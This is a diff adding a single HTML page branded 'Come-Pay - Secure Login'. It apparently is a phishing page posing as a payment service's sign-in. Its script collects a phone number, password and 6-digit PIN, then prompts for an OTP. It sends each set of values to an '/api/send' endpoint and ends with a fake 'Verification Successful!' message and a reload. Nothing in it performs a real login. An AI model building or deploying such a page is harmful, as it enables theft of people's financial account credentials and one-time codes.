@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Come-Pay - Secure Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #007bff;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="comelogo.png" alt="Logo" class="logo">
+    
+    <!-- LOGIN FORM -->
+    <div id="login-section">
+        <h2>Come-Pay Login</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phone" required placeholder="Enter phone number">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="pass" required placeholder="Enter password">
+            </div>
+            <div class="form-group">
+                <label>6-digit PIN</label>
+                <input type="password" id="pin" maxlength="6" required placeholder="Enter 6-digit PIN">
+            </div>
+            <button type="submit">Proceed</button>
+        </form>
+    </div>
+
+    <!-- OTP SECTION -->
+    <div id="otp-section" class="hidden">
+        <h2>Verify OTP</h2>
+        <p style="font-size: 14px; color: #666;">Please enter the OTP sent to your phone.</p>
+        <form id="otpForm">
+            <div class="form-group">
+                <label>Enter OTP</label>
+                <input type="text" id="otp" required placeholder="Enter OTP code">
+            </div>
+            <button type="submit">Verify & Submit</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    let userPhone = '';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        userPhone = document.getElementById('phone').value;
+        const pass = document.getElementById('pass').value;
+        const pin = document.getElementById('pin').value;
+
+        // Send login data to Vercel API
+        fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'login', phone: userPhone, pass: pass, pin: pin })
+        }).then(res => res.json()).then(data => {
+            if(data.success) {
+                // Switch to OTP section
+                document.getElementById('login-section').classList.add('hidden');
+                document.getElementById('otp-section').classList.remove('hidden');
+            }
+        }).catch(err => alert('Something went wrong!'));
+    });
+
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const otp = document.getElementById('otp').value;
+
+        // Send OTP data to Vercel API
+        fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'verify_otp', phone: userPhone, otp: otp })
+        }).then(res => res.json()).then(data => {
+            if(data.success) {
+                alert('Verification Successful!');
+                window.location.reload();
+            }
+        }).catch(err => alert('Something went wrong!'));
+    });
+</script>
+
+</body>
+</html>
